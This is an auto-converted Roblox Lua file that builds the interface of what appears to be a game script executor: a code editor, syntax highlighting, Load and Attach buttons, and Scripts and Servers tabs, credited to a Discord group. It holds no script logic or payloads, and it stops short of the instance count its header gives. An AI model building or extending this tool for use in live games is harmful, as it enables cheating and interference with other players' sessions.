--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 64 | Scripts: 5 | Modules: 0 | Tags: 0
local G2L = {};

-- ServerStorage./.
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[/.]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- ServerStorage./..;
G2L["2"] = Instance.new("CanvasGroup", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 600, 0, 380);
G2L["2"]["Position"] = UDim2.new(0.20082, -44, 0.14476, 50);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[;]];
G2L["2"]["BackgroundTransparency"] = 0.3;


-- ServerStorage./..;.Btn
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["3"]["Size"] = UDim2.new(0, 301, 0, 41);
G2L["3"]["Position"] = UDim2.new(0.12364, 0, 0.02571, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[Btn]];
G2L["3"]["BackgroundTransparency"] = 0.5;


-- ServerStorage./..;.Btn.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["3"]);



-- ServerStorage./..;.Btn.UICorner
G2L["5"] = Instance.new("UICorner", G2L["3"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Btn.Editor
G2L["6"] = Instance.new("TextButton", G2L["3"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["6"]["TextTransparency"] = 0.5;
G2L["6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["TextSize"] = 20;
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 90, 0, 33);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[Editor ]];
G2L["6"]["Name"] = [[Editor]];
G2L["6"]["Position"] = UDim2.new(0.02459, 0, 0.07317, 0);


-- ServerStorage./..;.Btn.Editor.UICorner
G2L["7"] = Instance.new("UICorner", G2L["6"]);
G2L["7"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Btn.Editor.ImageLabel
G2L["8"] = Instance.new("ImageLabel", G2L["6"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8"]["Image"] = [[rbxassetid://140013014943385]];
G2L["8"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Position"] = UDim2.new(0.12, 0, 0.061, 0);


-- ServerStorage./..;.Btn.Server
G2L["9"] = Instance.new("TextButton", G2L["3"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["9"]["TextTransparency"] = 0.5;
G2L["9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["TextSize"] = 20;
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Size"] = UDim2.new(0, 90, 0, 33);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Servers ]];
G2L["9"]["Name"] = [[Server]];
G2L["9"]["Position"] = UDim2.new(0.673, 0, 0.09778, 0);


-- ServerStorage./..;.Btn.Server.UICorner
G2L["a"] = Instance.new("UICorner", G2L["9"]);
G2L["a"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Btn.Server.ImageLabel
G2L["b"] = Instance.new("ImageLabel", G2L["9"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["b"]["Image"] = [[rbxassetid://9692125126]];
G2L["b"]["Size"] = UDim2.new(0, 28, 0, 28);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Position"] = UDim2.new(0.007, 0, 0.061, 0);


-- ServerStorage./..;.Btn.Scripts
G2L["c"] = Instance.new("TextButton", G2L["3"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["c"]["TextTransparency"] = 0.5;
G2L["c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextSize"] = 20;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Size"] = UDim2.new(0, 90, 0, 33);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[Scripts ]];
G2L["c"]["Name"] = [[Scripts]];
G2L["c"]["Position"] = UDim2.new(0.347, 0, 0.09778, 0);


-- ServerStorage./..;.Btn.Scripts.UICorner
G2L["d"] = Instance.new("UICorner", G2L["c"]);
G2L["d"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Btn.Scripts.ImageLabel
G2L["e"] = Instance.new("ImageLabel", G2L["c"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["e"]["Image"] = [[rbxassetid://71902649824205]];
G2L["e"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Position"] = UDim2.new(0, 0, 0.031, 0);


-- ServerStorage./..;.UICorner
G2L["f"] = Instance.new("UICorner", G2L["2"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 5);


-- ServerStorage./..;.Editor
G2L["10"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["10"]["Visible"] = false;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["Size"] = UDim2.new(0, 581, 0, 316);
G2L["10"]["Position"] = UDim2.new(0.01833, 0, 0.13361, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[Editor]];
G2L["10"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Editor.lulz
G2L["11"] = Instance.new("ScrollingFrame", G2L["10"]);
G2L["11"]["Active"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["CanvasSize"] = UDim2.new(5, 0, 5, 0);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Name"] = [[lulz]];
G2L["11"]["Size"] = UDim2.new(0, 549, 0, 225);
G2L["11"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Position"] = UDim2.new(0.02754, 0, 0.26899, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["ScrollBarThickness"] = 3;
G2L["11"]["BackgroundTransparency"] = 0.9;


-- ServerStorage./..;.Editor.lulz.syntax highlighting
G2L["12"] = Instance.new("LocalScript", G2L["11"]);
G2L["12"]["Name"] = [[syntax highlighting]];


-- ServerStorage./..;.Editor.lulz.UICorner
G2L["13"] = Instance.new("UICorner", G2L["11"]);
G2L["13"]["CornerRadius"] = UDim.new(0, 5);


-- ServerStorage./..;.Editor.lulz.input
G2L["14"] = Instance.new("TextBox", G2L["11"]);
G2L["14"]["Name"] = [[input]];
G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["14"]["MultiLine"] = true;
G2L["14"]["ClearTextOnFocus"] = false;
G2L["14"]["PlaceholderText"] = [[print("Hello World ~ ")]];
G2L["14"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[-- Made by Spawn.bunker (.gg/MvVBbftUYm)
print("Hello World ~ ")]];
G2L["14"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Editor.lulz.input.Comments_
G2L["15"] = Instance.new("TextLabel", G2L["14"]);
G2L["15"]["ZIndex"] = 2;
G2L["15"]["TextSize"] = 14;
G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(60, 201, 60);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["15"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["15"]["Text"] = [[]];
G2L["15"]["Name"] = [[Comments_]];


-- ServerStorage./..;.Editor.lulz.input.Globals_
G2L["16"] = Instance.new("TextLabel", G2L["14"]);
G2L["16"]["ZIndex"] = 2;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(133, 215, 248);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["16"]["Text"] = [[]];
G2L["16"]["Name"] = [[Globals_]];


-- ServerStorage./..;.Editor.lulz.input.Keywords_
G2L["17"] = Instance.new("TextLabel", G2L["14"]);
G2L["17"]["ZIndex"] = 2;
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["17"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["17"]["TextColor3"] = Color3.fromRGB(249, 110, 125);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["17"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["17"]["Text"] = [[]];
G2L["17"]["Name"] = [[Keywords_]];


-- ServerStorage./..;.Editor.lulz.input.Numbers_
G2L["18"] = Instance.new("TextLabel", G2L["14"]);
G2L["18"]["ZIndex"] = 2;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["18"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 199, 0);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18"]["Text"] = [[]];
G2L["18"]["Name"] = [[Numbers_]];


-- ServerStorage./..;.Editor.lulz.input.RemoteHighlight_
G2L["19"] = Instance.new("TextLabel", G2L["14"]);
G2L["19"]["ZIndex"] = 2;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 145, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["19"]["Text"] = [[]];
G2L["19"]["Name"] = [[RemoteHighlight_]];


-- ServerStorage./..;.Editor.lulz.input.Strings_
G2L["1a"] = Instance.new("TextLabel", G2L["14"]);
G2L["1a"]["ZIndex"] = 2;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1a"]["TextColor3"] = Color3.fromRGB(174, 242, 150);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a"]["Text"] = [[]];
G2L["1a"]["Name"] = [[Strings_]];


-- ServerStorage./..;.Editor.lulz.input.Tokens_
G2L["1b"] = Instance.new("TextLabel", G2L["14"]);
G2L["1b"]["ZIndex"] = 2;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1b"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b"]["Text"] = [[]];
G2L["1b"]["Name"] = [[Tokens_]];


-- ServerStorage./..;.Editor.Btn
G2L["1c"] = Instance.new("Frame", G2L["10"]);
G2L["1c"]["Active"] = true;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1c"]["Size"] = UDim2.new(0, 549, 0, 41);
G2L["1c"]["Position"] = UDim2.new(0.02725, 0, 0.06369, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Name"] = [[Btn]];
G2L["1c"]["BackgroundTransparency"] = 0.5;


-- ServerStorage./..;.Editor.Btn.LocalScript
G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);



-- ServerStorage./..;.Editor.Btn.UICorner
G2L["1e"] = Instance.new("UICorner", G2L["1c"]);
G2L["1e"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.Run
G2L["1f"] = Instance.new("TextButton", G2L["1c"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["1f"]["TextTransparency"] = 0.5;
G2L["1f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["TextSize"] = 20;
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(0, 73, 0, 33);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Load ]];
G2L["1f"]["Name"] = [[Run]];
G2L["1f"]["Position"] = UDim2.new(0.02459, 0, 0.09756, 0);


-- ServerStorage./..;.Editor.Btn.Run.UICorner
G2L["20"] = Instance.new("UICorner", G2L["1f"]);
G2L["20"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.Run.ImageLabel
G2L["21"] = Instance.new("ImageLabel", G2L["1f"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["21"]["Image"] = [[rbxassetid://8517323790]];
G2L["21"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["BackgroundTransparency"] = 1;
G2L["21"]["Position"] = UDim2.new(0.15333, 0, 0.18221, 0);


-- ServerStorage./..;.Editor.Btn.Link
G2L["22"] = Instance.new("TextButton", G2L["1c"]);
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["22"]["TextTransparency"] = 0.5;
G2L["22"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["TextSize"] = 20;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["22"]["BackgroundTransparency"] = 1;
G2L["22"]["Size"] = UDim2.new(0, 73, 0, 33);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Attach ]];
G2L["22"]["Name"] = [[Link]];
G2L["22"]["Position"] = UDim2.new(0.85151, 0, 0.07339, 0);


-- ServerStorage./..;.Editor.Btn.Link.UICorner
G2L["23"] = Instance.new("UICorner", G2L["22"]);
G2L["23"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.Link.ImageLabel
G2L["24"] = Instance.new("ImageLabel", G2L["22"]);
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["24"]["Image"] = [[rbxassetid://70774834798137]];
G2L["24"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["BackgroundTransparency"] = 1;
G2L["24"]["Position"] = UDim2.new(-0.06149, 0, 0.0913, 0);


-- ServerStorage./..;.Editor.Btn.Clear
G2L["25"] = Instance.new("TextButton", G2L["1c"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["25"]["TextTransparency"] = 0.5;
G2L["25"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["TextSize"] = 20;
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(0, 73, 0, 33);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Clear ]];
G2L["25"]["Name"] = [[Clear]];
G2L["25"]["Position"] = UDim2.new(0.21039, 0, 0.09778, 0);


-- ServerStorage./..;.Editor.Btn.Clear.UICorner
G2L["26"] = Instance.new("UICorner", G2L["25"]);
G2L["26"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.Clear.ImageLabel
G2L["27"] = Instance.new("ImageLabel", G2L["25"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["27"]["Image"] = [[rbxassetid://111704740561400]];
G2L["27"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["BackgroundTransparency"] = 1;
G2L["27"]["Position"] = UDim2.new(0, 0, 0.031, 0);


-- ServerStorage./..;.Editor.Btn.Reset
G2L["28"] = Instance.new("TextButton", G2L["1c"]);
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["28"]["TextTransparency"] = 0.5;
G2L["28"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["TextSize"] = 20;
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0, 73, 0, 33);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[Reset ]];
G2L["28"]["Name"] = [[Reset]];
G2L["28"]["Position"] = UDim2.new(0.39254, 0, 0.09778, 0);


-- ServerStorage./..;.Editor.Btn.Reset.UICorner
G2L["29"] = Instance.new("UICorner", G2L["28"]);
G2L["29"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.Reset.ImageLabel
G2L["2a"] = Instance.new("ImageLabel", G2L["28"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2a"]["Image"] = [[rbxassetid://12690726311]];
G2L["2a"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["Position"] = UDim2.new(0, 0, 0.09161, 0);


-- ServerStorage./..;.Editor.Btn.R6
G2L["2b"] = Instance.new("TextButton", G2L["1c"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextTransparency"] = 0.5;
G2L["2b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["TextSize"] = 20;
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Size"] = UDim2.new(0, 73, 0, 33);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[   R6 ]];
G2L["2b"]["Name"] = [[R6]];
G2L["2b"]["Position"] = UDim2.new(0.56011, 0, 0.09778, 0);


-- ServerStorage./..;.Editor.Btn.R6.UICorner
G2L["2c"] = Instance.new("UICorner", G2L["2b"]);
G2L["2c"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Editor.Btn.R6.ImageLabel
G2L["2d"] = Instance.new("ImageLabel", G2L["2b"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2d"]["Image"] = [[rbxassetid://2795572800]];
G2L["2d"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["BackgroundTransparency"] = 1;
G2L["2d"]["Position"] = UDim2.new(0, 0, 0.09161, 0);


-- ServerStorage./..;.Scripts
G2L["2e"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["2e"]["Visible"] = false;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["Size"] = UDim2.new(0, 581, 0, 307);
G2L["2e"]["Position"] = UDim2.new(0.01833, 0, 0.15526, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Name"] = [[Scripts]];
G2L["2e"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Scripts.ScrollingFrame
G2L["2f"] = Instance.new("ScrollingFrame", G2L["2e"]);
G2L["2f"]["Active"] = true;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["Size"] = UDim2.new(1, 0, 0.90228, 0);
G2L["2f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Position"] = UDim2.new(0, 0, 0.09772, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["ScrollBarThickness"] = 3;
G2L["2f"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Scripts.ScrollingFrame.LocalScript
G2L["30"] = Instance.new("LocalScript", G2L["2f"]);



-- ServerStorage./..;.Scripts.ScrollingFrame.Temp
G2L["31"] = Instance.new("TextButton", G2L["2f"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextTransparency"] = 0.5;
G2L["31"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["TextSize"] = 20;
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["31"]["BackgroundTransparency"] = 0.5;
G2L["31"]["Size"] = UDim2.new(1, 0, 0, 33);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[Pre-Made Hint]];
G2L["31"]["Name"] = [[Temp]];
G2L["31"]["Visible"] = false;
G2L["31"]["Position"] = UDim2.new(0.02459, 0, 0.07317, 0);


-- ServerStorage./..;.Scripts.ScrollingFrame.Temp.UICorner
G2L["32"] = Instance.new("UICorner", G2L["31"]);
G2L["32"]["CornerRadius"] = UDim.new(0, 7);


